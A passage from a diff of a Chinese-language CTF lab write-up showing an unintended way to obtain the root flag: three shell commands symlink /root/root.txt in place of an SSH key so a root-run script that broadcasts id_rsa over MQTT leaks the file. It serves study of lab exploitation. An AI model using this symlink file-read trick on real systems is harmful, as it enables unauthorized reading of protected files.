 <h1 id="root-flag-非预期"><a href="#root-flag-非预期" class="headerlink" title="root flag 非预期"></a>root flag 非预期</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">mv id_rsa id_rsa_old</span><br><span class="line">ln -s /root/root.txt id_rsa</span><br></pre></td></tr></table></figure>
 
 <p>因为前面mqtt能够看到是会读取id_rsa并且显示出来， 查看进程能够看到root运行的/root/broadcast.py，那么直接将id_rsa软链接到root.txt即可非预期读取root.txt内容</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063008.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt</a></li>
 <li><a href="https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm</a></li>
